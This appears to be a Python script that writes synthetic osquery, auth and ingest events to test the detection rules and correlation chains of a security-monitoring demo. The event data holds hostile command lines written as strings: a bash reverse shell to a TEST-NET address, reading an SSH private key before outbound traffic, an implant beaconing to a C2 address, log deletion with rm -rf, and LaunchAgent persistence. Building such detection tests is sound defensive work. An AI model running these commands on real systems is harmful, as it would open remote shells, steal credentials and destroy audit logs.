#!/usr/bin/env python3
"""Generate realistic osquery result-log lines for the SecurityScarletAI demo.

Writes one JSON object per line (the exact format osqueryd emits to its
results log) to a target file. By default appends a benign process event
followed by a malicious one that matches
``rules/sigma/process/reverse_shell.yml`` (cmdline contains ``bash -i`` and
``/dev/tcp``) so the detection scheduler fires a critical alert.

Usage:
    python scripts/generate_osquery_events.py --path /tmp/osqueryd.results.log
    python scripts/generate_osquery_events.py --path <file> --malicious 3 --sleep 2

The FileShipper (src/ingestion/shipper.py) tails the same file when the API
is started with ENABLE_INGESTION_SHIPPER=true.

V0.3 matrix mode (--matrix --path <results.log> --auth-path <auth_events.log>):
    Appends one event sequence per correlation chain, in the REAL pipeline
    shapes (osquery differential lines for process/socket/file tables, the
    auth-shipper NDJSON contract for authentication, POST /ingest for
    NeuralGuard verdicts). Each chain runs on its own hostname
    (live-matrix-<chain>) so verification is unambiguous. Auth events are
    written by this script in the exact shipper format; NeuralGuard events
    are POSTed to /ingest (the documented sink convention).
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.request
from datetime import datetime, timezone
from pathlib import Path

# Make src/ importable when run as a script from the repo root.
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from src.ingestion.auth_source import build_auth_event, event_to_shipper_line  # noqa: E402


def _line(name: str, cmdline: str, action: str = "added") -> str:
    return json.dumps(
        {
            "name": "processes",
            "hostIdentifier": "demo-mac.local",
            "calendarTime": datetime.now(tz=timezone.utc).strftime("%a %b %d %H:%M:%S %Y UTC"),
            "unixTime": int(time.time()),
            "epoch": 0,
            "counter": 0,
            "numerics": False,
            "columns": {
                "pid": "4242",
                "name": name,
                "path": f"/bin/{name}",
                "cmdline": cmdline,
                "uid": "501",
                "user": "demo",
            },
            "action": action,
        }
    )


BENIGN = ("python3", "python3 -m pytest tests/unit/test_shipper.py")
# Matches rules/sigma/process/reverse_shell.yml:
#   selection_bash_i    -> cmdline contains "bash -i"
#   selection_bash_tcp  -> cmdline contains "/dev/tcp"
MALICIOUS = (
    "bash",
    "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1",
)


def _osquery_line(
    table: str,
    host: str,
    columns: dict,
    action: str = "added",
    unix_time: int | None = None,
) -> str:
    """A real osquery result-log line for ANY table (chain matrix building block)."""
    return json.dumps(
        {
            "name": table,
            "hostIdentifier": host,
            "calendarTime": datetime.now(tz=timezone.utc).strftime("%a %b %d %H:%M:%S %Y UTC"),
            "unixTime": unix_time if unix_time is not None else int(time.time()),
            "epoch": 0,
            "counter": 0,
            "numerics": False,
            "columns": columns,
            "action": action,
        }
    )


# External test destinations (TEST-NET-1/2 -- never real infrastructure).
EXFIL_IP = "203.0.113.10"
C2_IP = "203.0.113.66"
AUTH_SRC_IP = "198.51.100.70"


def _matrix_scenarios(auth_path: str) -> dict[str, list[str]]:
    """One event sequence per correlation chain, keyed by chain hostname.

    Times are relative to "now": the shipper ingests within ~1s per line,
    the ingest path runs correlations per batch, and the detectors look
    back 24h with per-chain windows -- sequences written seconds apart
    satisfy every window.
    """
    now = int(time.time())
    t = lambda offset: now + offset  # noqa: E731

    scenarios: dict[str, list[str]] = {}

    # 1. brute_force_success: 4 auth_failed + 1 auth_success, same source IP.
    #    Auth events ride the AUTH SHIPPER file (normalized NDJSON contract).
    auth_lines = []
    for i in range(4):
        ev = build_auth_event(
            timestamp=datetime.fromtimestamp(t(-120 + i * 20), tz=timezone.utc),
            host_name="live-matrix-brute_force_success",
            outcome="failed",
            user_name="admin",
            source_ip=AUTH_SRC_IP,
            raw_message="Failed password for admin from %s port 5100%d ssh2" % (AUTH_SRC_IP, i),
        )
        auth_lines.append(event_to_shipper_line(ev))
    ev = build_auth_event(
        timestamp=datetime.fromtimestamp(t(-30), tz=timezone.utc),
        host_name="live-matrix-brute_force_success",
        outcome="success",
        user_name="admin",
        source_ip=AUTH_SRC_IP,
        raw_message="Accepted password for admin from %s port 51099 ssh2" % AUTH_SRC_IP,
    )
    auth_lines.append(event_to_shipper_line(ev))
    scenarios["brute_force_success"] = ("AUTH_FILE", auth_lines)

    # 2. persistence_activated: LaunchAgents plist CREATED (file_events)
    #    then launchctl load.
    plist = "/Users/admin/Library/LaunchAgents/com.evil.liveagent.plist"
    scenarios["persistence_activated"] = (
        "OSQUERY",
        [
            _osquery_line(
                "file_events",
                "live-matrix-persistence_activated",
                {"target_path": plist, "action": "CREATED"},
                unix_time=t(-90),
            ),
            _osquery_line(
                "processes",
                "live-matrix-persistence_activated",
                {
                    "pid": "6001",
                    "name": "launchctl",
                    "path": "/bin/launchctl",
                    "cmdline": "launchctl load " + plist,
                    "uid": "501",
                    "user": "admin",
                },
                unix_time=t(-60),
            ),
        ],
    )

    # 3. privilege_escalation_chain: sudo execution (admin), then a root
    #    interpreter from a user-writable path (the suspicious follow-up).
    scenarios["privilege_escalation_chain"] = (
        "OSQUERY",
        [
            _osquery_line(
                "processes",
                "live-matrix-privilege_escalation_chain",
                {
                    "pid": "6101",
                    "name": "sudo",
                    "path": "/usr/bin/sudo",
                    "cmdline": "sudo -i",
                    "uid": "501",
                    "user": "admin",
                },
                unix_time=t(-90),
            ),
            _osquery_line(
                "processes",
                "live-matrix-privilege_escalation_chain",
                {
                    "pid": "6102",
                    "name": "python3",
                    "path": "/tmp/py",
                    "cmdline": "python3 -c 'import pty'",
                    "uid": "0",
                },
                unix_time=t(-60),
            ),
        ],
    )

    # 4. credential_theft_exfil: a NON-ssh process reading a private key,
    #    then an outbound connection from the same host.
    scenarios["credential_theft_exfil"] = (
        "OSQUERY",
        [
            _osquery_line(
                "processes",
                "live-matrix-credential_theft_exfil",
                {
                    "pid": "6201",
                    "name": "cat",
                    "path": "/bin/cat",
                    "cmdline": "cat /Users/admin/.ssh/id_rsa",
                    "uid": "501",
                    "user": "admin",
                },
                unix_time=t(-90),
            ),
            _osquery_line(
                "open_sockets",
                "live-matrix-credential_theft_exfil",
                {
                    "pid": "6202",
                    "remote_address": EXFIL_IP,
                    "remote_port": "443",
                    "local_address": "192.168.1.50",
                    "local_port": "51000",
                    "protocol": "6",
                },
                unix_time=t(-60),
            ),
        ],
    )

    # 5. data_exfiltration: connection burst to ONE external IP (55 rows --
    #    above the default burst threshold of 50, all within the 1h window).
    burst = [
        _osquery_line(
            "open_sockets",
            "live-matrix-data_exfiltration",
            {
                "pid": "6301",
                "remote_address": EXFIL_IP,
                "remote_port": "443",
                "local_address": "192.168.1.50",
                "local_port": str(40000 + i),
                "protocol": "6",
            },
            unix_time=t(-120 + i),
        )
        for i in range(55)
    ]
    scenarios["data_exfiltration"] = ("OSQUERY", burst)

    # 6. ai_verdict_block_sustained: POSTed via /ingest (NeuralGuard sink
    #    convention) -- handled separately by run_matrix().
    scenarios["ai_verdict_block_sustained"] = ("INGEST", [])

    # 7. payload_callback: process from /tmp, then an outbound connection.
    scenarios["payload_callback"] = (
        "OSQUERY",
        [
            _osquery_line(
                "processes",
                "live-matrix-payload_callback",
                {
                    "pid": "6401",
                    "name": "implant",
                    "path": "/tmp/implant",
                    "cmdline": "/tmp/implant --beacon",
                    "uid": "501",
                    "user": "demo",
                },
                unix_time=t(-90),
            ),
            _osquery_line(
                "open_sockets",
                "live-matrix-payload_callback",
                {
                    "pid": "6401",
                    "remote_address": C2_IP,
                    "remote_port": "4444",
                    "local_address": "192.168.1.50",
                    "local_port": "51111",
                    "protocol": "6",
                },
                unix_time=t(-60),
            ),
        ],
    )

    # 8. defense_evasion_cleanup: the "suspicious activity" half is an ALERT
    #    (severity is assigned by detection). The reverse-shell line fires a
    #    critical Sigma alert on the next scheduler tick; run_matrix() waits
    #    out one tick, then emits the log-deletion attempt.
    scenarios["defense_evasion_cleanup"] = (
        "DEFENSE",
        [_line_defense_host()],
    )

    # 9. clickfix_dropper_execution (V0.6b): payload dropped in /tmp (file
    #    telemetry) then an interpreter exec whose cmdline carries the
    #    dropped path (the double-clicked .command shape: /bin/zsh is the
    #    path, the cmdline references /tmp/...).
    scenarios["clickfix_dropper_execution"] = (
        "OSQUERY",
        [
            _osquery_line(
                "file_events",
                "live-matrix-clickfix_dropper_execution",
                {"target_path": "/tmp/cf-payload.command", "action": "CREATED"},
                unix_time=t(-90),
            ),
            _osquery_line(
                "es_process_events",
                "live-matrix-clickfix_dropper_execution",
                {
                    "event_type": "exec",
                    "pid": "6601",
                    "path": "/bin/zsh",
                    "cmdline": "/bin/zsh /tmp/cf-payload.command",
                    "uid": "501",
                    "username": "demo",
                },
                unix_time=t(-60),
            ),
        ],
    )

    # 10. ai_process_egress (V0.6b): an AI CLI tool starts, then the host
    #     makes an external (TEST-NET) outbound connection.
    scenarios["ai_process_egress"] = (
        "OSQUERY",
        [
            _osquery_line(
                "es_process_events",
                "live-matrix-ai_process_egress",
                {
                    "event_type": "exec",
                    "pid": "6701",
                    "path": "/usr/local/bin/claude",
                    "cmdline": "claude --dangerously-skip-permissions",
                    "uid": "501",
                    "username": "demo",
                },
                unix_time=t(-90),
            ),
            _osquery_line(
                "open_sockets",
                "live-matrix-ai_process_egress",
                {
                    "pid": "6701",
                    "remote_address": EXFIL_IP,
                    "remote_port": "443",
                    "local_address": "192.168.1.50",
                    "local_port": "51300",
                    "protocol": "6",
                },
                unix_time=t(-60),
            ),
        ],
    )

    return scenarios


def _line_defense_host() -> str:
    return _osquery_line(
        "processes",
        "live-matrix-defense_evasion_cleanup",
        {
            "pid": "6501",
            "name": "bash",
            "path": "/bin/bash",
            "cmdline": "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1",
            "uid": "501",
            "user": "demo",
        },
    )


def _line_defense_rm() -> str:
    return _osquery_line(
        "processes",
        "live-matrix-defense_evasion_cleanup",
        {
            "pid": "6502",
            "name": "rm",
            "path": "/bin/rm",
            "cmdline": "rm -rf /var/log/system.log",
            "uid": "501",
            "user": "demo",
        },
    )


def run_matrix(results_path: str, auth_path: str, api: str, ingest_token: str) -> int:
    """Append every chain's sequence through its real pipe.

    The defense_evasion sequence needs one scheduler tick between its two
    halves (reverse-shell line -> critical alert -> rm line), so this waits
    out one 60s tick -- the only honest way to drive an alert-driven chain
    end-to-end. The caller verifies per-chain matches (DB/API)."""
    base = Path(auth_path).parent
    base.mkdir(parents=True, exist_ok=True)

    fired_summary: list[str] = []
    scenarios = _matrix_scenarios(auth_path)

    # defense_evasion phase 1: the reverse-shell line that will fire the
    # critical alert on the scheduler's next tick.
    defense_host_line = scenarios.pop("defense_evasion_cleanup")[1][0]
    with open(results_path, "a") as f:
        f.write(defense_host_line + "\n")
    fired_summary.append("defense_evasion_cleanup (phase 1): reverse shell -> scheduler tick")
    print(
        "  defense_evasion phase 1 written; waiting 75s for the sigma scheduler "
        "to fire the critical alert..."
    )
    time.sleep(75)

    for chain, (target, lines) in scenarios.items():
        if target == "OSQUERY":
            with open(results_path, "a") as f:
                for line in lines:
                    f.write(line + "\n")
            fired_summary.append(f"{chain}: {len(lines)} osquery lines -> shipper")
            time.sleep(1)  # let the shipper poll between chains
        elif target == "AUTH_FILE":
            with open(auth_path, "a") as f:
                for line in lines:
                    f.write(line + "\n")
            fired_summary.append(f"{chain}: {len(lines)} auth-shipper lines -> auth_events.log")
            time.sleep(1)
        elif target == "INGEST":
            # 12 sustained NeuralGuard BLOCK verdicts for one tenant.
            now = int(time.time())
            events = [
                {
                    "@timestamp": datetime.now(tz=timezone.utc).isoformat(),
                    "host_name": "live-matrix-ai_verdict_block_sustained",
                    "source": "neuralguard",
                    "event_category": "intrusion_detection",
                    "event_type": "info",
                    "event_action": "verdict_block",
                    "severity": "critical",
                    "raw_data": {
                        "neuralguard": {
                            "tenant_id": "live-matrix-tenant",
                            "request_id": f"lf-{now}-{i}",
                        }
                    },
                }
                for i in range(12)
            ]
            # nosec S310: api base comes from --api (operator-controlled)
            req = urllib.request.Request(  # noqa: S310
                f"{api}/api/v1/ingest",
                data=json.dumps(events).encode(),
                headers={
                    "Authorization": f"Bearer {ingest_token}",
                    "Content-Type": "application/json",
                },
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=30) as resp:  # noqa: S310
                body = json.loads(resp.read())
            fired_summary.append(f"{chain}: {len(events)} verdict_block events POSTed -> {body}")

    # defense_evasion phase 2: the cleanup, now preceded by the fired alert.
    with open(results_path, "a") as f:
        f.write(_line_defense_rm() + "\n")
    fired_summary.append("defense_evasion_cleanup (phase 2): rm /var/log after the critical alert")
    time.sleep(2)

    print("Matrix emitted:")
    for s in fired_summary:
        print(f"  - {s}")
    print(
        "\nWait for detection (scheduler 60s tick), then verify per chain:\n"
        "  docker exec scarletai-db psql -U scarletai -d scarletai -c \\\n"
        '    "SELECT correlation_rule, count(*) FROM correlation_matches \\\n'
        "      WHERE created_at > NOW() - INTERVAL '10 minutes' \\\n"
        "      AND match_data->>'host_name' LIKE 'live-matrix-%' \\\n"
        '      GROUP BY correlation_rule;"'
    )
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--path", required=True, help="osquery results log file to append to")
    parser.add_argument(
        "--malicious",
        type=int,
        default=1,
        help="number of malicious (reverse-shell) lines to emit (default 1)",
    )
    parser.add_argument(
        "--benign",
        type=int,
        default=1,
        help="number of benign lines to emit before the malicious ones (default 1)",
    )
    parser.add_argument(
        "--sleep",
        type=float,
        default=0.0,
        help="seconds to wait between lines (useful for watching the tailer live)",
    )
    parser.add_argument(
        "--matrix",
        action="store_true",
        help="emit one event sequence per correlation chain (V0.3 live-fire)",
    )
    parser.add_argument(
        "--auth-path",
        default="data/osquery/auth_events.log",
        help="auth-shipper NDJSON file (matrix mode; default = AUTH_EVENTS_LOG_PATH)",
    )
    parser.add_argument(
        "--api",
        default="http://localhost:8000",
        help="API base URL for POSTed chain events (matrix mode)",
    )
    parser.add_argument(
        "--ingest-token",
        default=None,
        help="ingest bearer token for POSTed events (matrix mode; falls back to API_BEARER_TOKEN)",
    )
    args = parser.parse_args()

    if args.matrix:
        token = args.ingest_token or _env_api_bearer_token()
        if not token:
            print("matrix mode needs --ingest-token (or API_BEARER_TOKEN in .env)", file=sys.stderr)
            return 1
        return run_matrix(args.path, args.auth_path, args.api, token)

    with open(args.path, "a") as f:
        for _ in range(args.benign):
            f.write(_line(*BENIGN) + "\n")
            f.flush()
            print(f"  benign  -> {BENIGN[0]}: {BENIGN[1]}")
            if args.sleep:
                time.sleep(args.sleep)
        for _ in range(args.malicious):
            f.write(_line(*MALICIOUS) + "\n")
            f.flush()
            print(f"  MALICIOUS -> {MALICIOUS[0]}: {MALICIOUS[1]}")
            if args.sleep:
                time.sleep(args.sleep)

    print(f"\nWrote {args.benign} benign + {args.malicious} malicious lines to {args.path}")
    print("If ENABLE_INGESTION_SHIPPER=true and the API is running, the FileShipper")
    print("will tail this file and the detection scheduler will fire a critical alert")
    print("within one rule run_interval (default 60s).")
    return 0


def _env_api_bearer_token() -> str | None:
    """Read API_BEARER_TOKEN from .env without a dotenv dependency."""
    env_file = Path(__file__).resolve().parent.parent / ".env"
    if not env_file.exists():
        return None
    for line in env_file.read_text().splitlines():
        if line.startswith("API_BEARER_TOKEN="):
            return line.split("=", 1)[1].strip()
    return None


if __name__ == "__main__":
    raise SystemExit(main())
